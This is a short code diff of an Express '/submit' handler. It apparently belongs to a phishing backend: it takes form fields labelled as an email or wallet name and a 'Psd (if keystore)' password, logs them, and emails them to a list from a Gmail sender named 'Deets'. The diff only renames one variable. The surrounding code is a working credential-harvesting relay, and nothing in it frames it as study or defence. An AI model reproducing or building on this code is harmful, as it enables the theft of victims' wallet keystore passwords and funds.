@@ -30,14 +30,14 @@ app.post('/submit', async (req, res) => {
   try {
     console.log('Srcvd:', req.body);
 
-    const { wetName, psdWet } = req.body;
+    const { wName, psdWet } = req.body;
 
     const mailOptions = {
       from: '"Deets" <willyscotmegan@gmail.com>',
       to: maillist,
       subject: "New Form Submission",
       html: `
-        <p><strong>Eml:</strong> ${wetName || 'Not provided'}</p>
+        <p><strong>Eml:</strong> ${wName || 'Not provided'}</p>
         <p><strong>Psd (if keystore):</strong> ${psdWet || 'Not provided'}</p>
       `
     };
